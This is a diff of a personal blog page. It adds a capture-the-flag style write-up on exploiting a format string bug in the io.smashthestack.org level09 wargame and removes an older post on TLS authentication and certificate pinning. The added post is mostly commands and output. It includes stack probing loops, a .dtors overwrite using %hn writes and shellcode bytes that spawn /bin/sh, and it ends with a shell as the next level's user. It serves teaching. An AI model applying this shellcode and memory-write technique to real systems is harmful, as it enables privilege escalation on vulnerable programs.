@@ -108,6 +108,179 @@
   
   <div class="post">
     <h1 class="post-title">
+      <a href="/posts/level09iosmash">
+        Format Strings - Level09 smashTheStack
+      </a>
+    </h1>
+
+    <span class="post-date">12 Mar 2015</span>
+
+    <p>The topic for this entry is about format string vulnerability. The vulnerability appears when we use functions as <code>printf</code> and so on wrongly.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>  <span class="c1">//Good</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// wrong - What would happen if buf is &quot;%x%x%x&quot;?</span>
+</code></pre></div>
+<p>When we call the latest printf call we are going to read from the stack. The layout would be the following</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     Top of the Stack
+-------------------------
+|       Address of buf  |
+-------------------------
+|       Value of %x     |
+-------------------------
+|       Value of %x     |
+-------------------------
+|       Value of %x     |
+-------------------------
+|        ....           |
+-------------------------
+  Bottom of the Stack
+</code></pre></div>
+<p>The fun of this is that you can read, write on whatever direction you want. I am not going to write about how to do it since other have written before about <a href="http://inst.eecs.berkeley.edu/%7Ecs161/sp08/Notes/formatstring-1.2.pdf">this</a>.</p>
+
+<p>The code to exploit is the level09 from <a href="http://io.smashthestack.org">io.smashthestack.org</a>.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span>  <span class="n">pad</span> <span class="o">=</span> <span class="mh">0xbabe</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ ./level09 AAAA%x%x%x%x
+AAAAbffffe343ff160d7c41414141
+level9@io:/levels$ ./level09 AAAA4%4\$x
+AAAA441414141
+</code></pre></div>
+<p>The idea is instead of <code>AAAA</code> that does nothing, write an interesting direction using <code>%n</code> to alter the normal execution of our program. There are different paths to follow to exploit this little code but I am going to use <code>.dtors</code> section. For those that don&#39;t know about <code>.dtors</code> is a section that all binaries on linux compiled with <code>gcc</code> have it. This section has an array of functions that will be called when main function exits.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ nm level09
+....
+080494d4 d __DTOR_END__
+080494d0 d __DTOR_LIST__
+080484c4 r __FRAME_END__
+....
+
+level9@io:/levels$ objdump -h level09
+
+level09:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+...
+
+ 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+....
+</code></pre></div>
+<p>We can see that the section .dtors starts in <code>0x080494d0</code>.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text"> level9@io:/levels$ objdump -s -j .dtors level09
+
+level09:     file format elf32-i386
+
+Contents of section .dtors:
+ 80494d0 ffffffff 00000000                    ........
+</code></pre></div>
+<p>How we have said before the <code>.dtors</code> section is an array of functions. This array always starts with <code>0xffffffff</code> and ends with the NULL address <code>0x00000000</code>. It&#39;s easy to deduce that level09 does not have any destructor. But that is not a reason to give up since this section is writable we are going to be able to write our own destructor :).</p>
+
+<p>The idea is write in <code>.dtors</code> with the goal of redirect the flow of the execution to the code that we will write in argv[1]. The first task that we must accomplish is to know the address of argv[1].</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">level9@io:/levels<span class="nv">$ </span><span class="k">for</span> <span class="o">((</span><span class="nv">i</span> <span class="o">=</span> 250<span class="p">;</span> i &lt; 330<span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&quot;$i: &quot;</span> <span class="o">&amp;&amp;</span> ./level09 <span class="s2">&quot;%$i\$s&quot;</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -n <span class="s1">$&#39;\n&#39;</span> <span class="p">;</span> <span class="k">done</span>
+
+294: �É�
+295: ,�
+296: Segmentation fault
+297: 1�^����PTRh
+298: <span class="o">(</span>null<span class="o">)</span>
+299: ������������U���<span class="o">=</span>Е
+300: U���<span class="o">(</span>
+301: Segmentation fault
+302: 8���B���
+303: U��WVS�O
+304: U��<span class="o">]</span>Ít<span class="p">&amp;</span>
+305: U��WV1�S辊
+306:���
+307:
+308: Segmentation fault
+309: ./level09
+310: %310<span class="nv">$s</span>
+311: <span class="o">(</span>null<span class="o">)</span>
+312: <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+313: <span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+314: <span class="nv">SSH_CLIENT</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 22
+315: <span class="nv">OLDPWD</span><span class="o">=</span>/tmp
+316: <span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/5
+317: <span class="nv">USER</span><span class="o">=</span>level9
+318: <span class="nv">MAIL</span><span class="o">=</span>/var/mail/level9
+319: <span class="nv">PATH</span><span class="o">=</span>/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+320: <span class="nv">PWD</span><span class="o">=</span>/levels
+321: <span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8
+322: <span class="nv">SHLVL</span><span class="o">=</span>1
+323: <span class="nv">HOME</span><span class="o">=</span>/home/level9
+324: <span class="nv">LANGUAGE</span><span class="o">=</span>en_GB:en
+325: <span class="nv">LOGNAME</span><span class="o">=</span>level9
+326: <span class="nv">SSH_CONNECTION</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 10.16.0.102 22
+327: <span class="nv">LC_CTYPE</span><span class="o">=</span>es_ES.UTF-8
+328: <span class="nv">_</span><span class="o">=</span>./level09
+329: <span class="o">(</span>null<span class="o">)</span>
+
+level9@io:/levels<span class="nv">$ </span>./level09 %310<span class="se">\$</span>x
+bffffe42
+</code></pre></div>
+<p>Basically we have walked through the stack to read everything from it to extract where resides argv[1]. Using direct parameter access we know that argv[1] is in 310th position and around <code>0xbffffe42</code>.
+The latest direction will vary regarding how many data we write. As much data we write in argv[1] the lower the address will be.</p>
+
+<p>Using the short write we are able to write two bytes so we are going to need two directions to write in it followed by the payload.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+</code></pre></div>
+<p><code>\xd6\x94\x04\x08</code> is to write <code>bfff</code> and in <code>\xd4\x94\x04\x08</code> to write the lower bytes of argv[1]&#39;s address. We should know how much characters we need before to use <code>%n</code> to write the desire number. The payload has a length of <code>0x38</code>.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
+(gdb) p 0xbfff - 0x38
+$1 = 49095
+(gdb) p 0xfe42 - 0xbfff
+$2 = 15939
+</code></pre></div>
+<p>We are going to need 49095 more characters before to use <code>%n</code> to write <code>0xbfff</code> in <code>0x080494d6</code> and about 15939 to write <code>fe42</code> in <code>0x080494d4</code> although that will not be the exact value we will need to write. All this can be accomplished using the width specifier.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn
+</code></pre></div>
+<p>This would be the first part of our payload. The problem is that we don&#39;t know where argv[1] is in the memory since the array has grown. But we can deduce it using format string.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hx%15939x%310\$hx
+
+.....
+3fffdf6
+</code></pre></div>
+<p>It&#39;s means that in <code>0xbffffdf6</code> is our argv[1].</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
+(gdb) p 0xfdf6 - 0xbfff
+$1 = 15863
+</code></pre></div>
+<p>The problem is that if we write <code>fdf6</code> the flow of the program will go at the beginning of argv[1] but the initial part are the directions of <code>.dtors</code>. The direction to write would be around <code>0xbffffdfa</code> where our payload really starts and it begins with a nop slide to augment our likelihood of success.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) p 0xfdfa - 0xbfff
+$1 = 15867
+</code></pre></div>
+<p>And there it is, we have everything to exploit the vulnerability.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn%15867x%5\$hn
+
+sh-4.2$ whoami
+level10
+sh-4.2$ cat /home/level10/.pass
+Os**********
+</code></pre></div>
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&text=Format Strings - Level09 smashTheStack&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
       <a href="/posts/qcrk5crackme">
         Defeating qcrk5 crackme
       </a>
@@ -268,65 +441,6 @@ Correct, Cracked !!
 </code></pre></div>
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/qcrk5crackme&text=Defeating qcrk5 crackme&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/TLS">
-        TLS and PKI
-      </a>
-    </h1>
-
-    <span class="post-date">18 Feb 2015</span>
-
-    <p>Today we are going to talk about TLS and its nuances when the authentication takes place. For those who do not know my master thesis work was about this topic. TLS is likely to be the security protocol most used on Internet. TLS aims to provide: confidentiality, authentication and integrity. If one of these properties are not achieved our security is useless. No matter what strong our cipher be if we are talking with the wrong guy, I mean, if we talk with Facebook or whatever server we must ensure that we are talking with the right entity. TLS besides troubles with authentication also has had troubles with encryption, implementation and many others but today I am only going to write about authentication.</p>
-
-<p>When we connect to a server using TLS, previous to exchange data that belongs to the application, it starts a phase; whose name is Handshake Protocol, to establish parameters of the communication as well as: TLS version, algorithms, master-secret ... etc.  <img src="http://orm-chimera-prod.s3.amazonaws.com/1230000000545/images/hpbn_0402.png" alt="handshake"></p>
-
-<p>One of those messages aims to authenticate the server. This message is the certificate, but it is composed of various certificates forming a chain. </p>
-
-<p><img src="http://orm-chimera-prod.s3.amazonaws.com/1230000000545/images/hpbn_0405.png" alt="chain-trust"></p>
-
-<p>The client to be sure that it&#39;s talking with the real server validates that certificate using PKI. Basically it ensures that the certificate belongs to the domain that the user had connected, is not expired, is not revoked and is signed by a root certificate that belongs to a CA -Certificate Authority-. These root certificates are trusted by anyone on Internet. The danger of this is that any CA can issue certificates for whatever domain and everything is correct. What would happen if a CA is compromised? The answer of this is simple; the attacker has the ability to issue valid certificates for Google&#39;s and  Facebook&#39;s domain for example. This has happened in the past like <a href="http://en.wikipedia.org/wiki/DigiNotar">DigiNotar</a>. There are other issues with authentication in TLS related for example with the <a href="https://www.imperialviolet.org/2014/04/19/revchecking.html">revocation status</a>.</p>
-
-<p>Despite this wild environment where TLS is working now, there are new technologies that have emerged to try fix some issues. That has been my work during my master thesis; a study of each of the brand technologies, although some of them have been for years, to develop a little tool to strengthen the authentication. These technologies are.</p>
-
-<ul>
-<li>DANE</li>
-<li>Pinning</li>
-<li>Certificate Transparency</li>
-<li>Blacklist</li>
-<li>ICSI Notary</li>
-<li>OCSP Checking</li>
-</ul>
-
-<p>In internet you may find more information about these technologies but I am going to write a little bit about the most important ones.</p>
-
-<p>Pinning by now is the most prominent because it reduces the attack surface. Basically pinning saves what it expects to receive. Now if we receive a certificate that belongs to Facebook this must be equal to the saved value if not, we are under attack. The question regarding pinning is about which certificate save. Normally is saved the hash of the SubjectPublicKeyInfo of the certificate. The real problem is which certificate on the chain choose. There is another problem with pinning. As client, how can I retrieve that information in a security fashion and trustworthy? In other words the bootstrapping. Pinning is a huge improvement but much works remains to be done. There are options to implement pinning nowadays, one is a draft to bring <a href="http://tools.ietf.org/html/draft-ietf-websec-key-pinning-21">pinning to HTTP</a> and other is Moxie&#39;s approach that bring Pinning to TLS, whose name is <a href="https://tack.io">TACK</a> (it seems that TACK domain is not longer working).</p>
-
-<p>DANE brings the pinning information using DNS architecture. But DNS is not secure that is why instead of DNS uses DNSSEC. Regarding DNSSEC many have been written <a href="https://www.imperialviolet.org/2015/01/17/notdane.html">[1]</a><a href="http://sockpuppet.org/blog/2015/01/15/against-dnssec/">[2]</a>.</p>
-
-<p>Certificate Transparency is a proposal by Google that tired of seeing CA compromised or rogue, decided to build a huge database of all certificates to try monitor them with the aim to catch before such certificates misuse. This approach is under experiment although Chrome is forcing to use it by those certificates with EV.</p>
-
-<p>The tool that I developed is a sniffer that listen the network to extract the certificate that is exchanged during the TLS Handshake, to apply these techniques and get a better response and detect possible MITM attacks. Also there is a little framework that provides a means to notify the user about problems related with the authentication. Anyone would be free to add different approaches. I wrote a little python code to send a notification to the Notification Center on Mac OS X. Is possible to write different methodologies to validate a certificate since the project is written to make this easy to accomplish. Check the tool on <a href="https://github.com/alvarofe/cassle">cassle</a>.</p>
-
-<iframe width="600" height="400" src="https://www.youtube.com/embed/iIAdJ92nIgU" frameborder="0" allowfullscreen></iframe>
-
-<p>I had thought to take it to another level and insted of listen the network since I do not have any possibility to shutdown the connection make it more active. I had thought to write a library to hook or extend the OpenSSL library to include these methodologies. But it turns out that there were others that had thought the same and the result is the following <a href="https://github.com/iSECPartners/publications/blob/master/whitepapers/certshim_ccs14.pdf?raw=true">CERTSHIM</a>. I will try to look more close at it and learning how they are doing it :).</p>
-
-<p>Now I am developing the evolution of cassle and the name is gocassle, basically because is implemented using Golang. Python has some limitations about create concurrency program due to the GIL, since finally all the threads on python are going to be bloqued by GIL and only one will be executed and the idea to create processes is expensive. So I decided to try Golang and the result is that I&#39;m in love with Golang since thanks to goroutines and channels is possible write concurrency program easily and also is a compiled language so the efficiency is going to be better. Golangs remember me write C code and I love it and I wanted to learn it. </p>
-
-<p>The idea of gocassle is basically build a distributed  system to pin the network. There will be slaves and masters. These slaves are going to listen the network to extract the certificates and send them to the master. The master will have a database with pins obtained from its slaves. After that the slave and other software, could use the master&#39;s database to know about what certificate must be received. </p>
-
-<p>I do not know to where I&#39;ll get, as have to combine these with other things as find a job, study things and so on. But at least I would like to develop something very easily not very complicated by now, to see the value of the tool. The tool will be at <a href="https://www.github.com/alvarofe/gocassle">gocassle</a>.</p>
-
-<p>If you are interested on TLS I recommend you follow on Twitter or reading in internet about their researches: Moxie Marlinspike, Ivan Ristic and Adam Langley.</p>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/TLS&text=TLS and PKI&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
